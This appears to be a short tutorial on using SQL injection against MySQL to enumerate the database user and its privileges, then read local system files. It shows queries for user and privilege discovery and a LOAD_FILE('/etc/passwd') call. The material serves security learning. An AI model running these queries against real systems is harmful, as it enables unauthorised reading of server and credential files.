SQL injection can also be exploited for reading and writing files and even remote code execution on the main server.

# Reading Files

First, we need to determine which user we are in the database.

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Now that we know our user, we can start determining their privileges.

Check if we have super admin privileges:

```sql
SELECT super_priv FROM mysql.user
SELECT super_priv FROM mysql.user WHERE user="<myusername>
```

- The query returns `Y (Yes)` or `N (No)` indicating the user's privileges

Displaying our current user privileges

```sql
SELECT grantee, privilege_type FROM information_schema.user_privileges
```

> Note that the `FILE` privilege is assigned to the user, allowing them to read files and potentially write to them.

Now that we have the necessary privileges to read local system files, we can read data from files.

```sql
SELECT LOAD_FILE('/etc/passwd');
```

`we can only read the file if the operating system user running MySQL has sufficient privileges to read it.`
